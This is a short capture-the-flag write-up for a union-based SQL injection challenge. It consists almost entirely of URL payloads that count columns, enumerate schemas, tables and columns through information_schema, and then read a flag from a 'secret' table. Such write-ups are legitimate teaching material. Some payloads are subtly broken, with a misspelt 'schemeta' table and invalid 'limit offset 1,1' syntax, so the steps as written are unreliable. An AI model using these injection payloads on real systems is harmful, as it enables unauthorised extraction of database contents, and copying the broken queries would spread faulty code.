# EasyPeasy

## Description:

> Union-based SQL Injection!

## Solution:

Find the number of columns by iterating.

```
?id=-1 union select 1,2,3
```

Iterate schema names.

```
?id=-1 union select 1,schema_name,3 from information_schema.schemeta limit offset 1,1

```

Iterate table names.

```
?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema='fl4g' limit offset 1,1

```

Iterate column names.

```
?id=-1 union select 1,column_name,3 from information_schema.columns WHERE table_name='secret' limit 1,1

```

Finally get the value.

```
?id=-1 union select 1,THIS_IS_FLAG_YO,3 from fl4g.secret

```
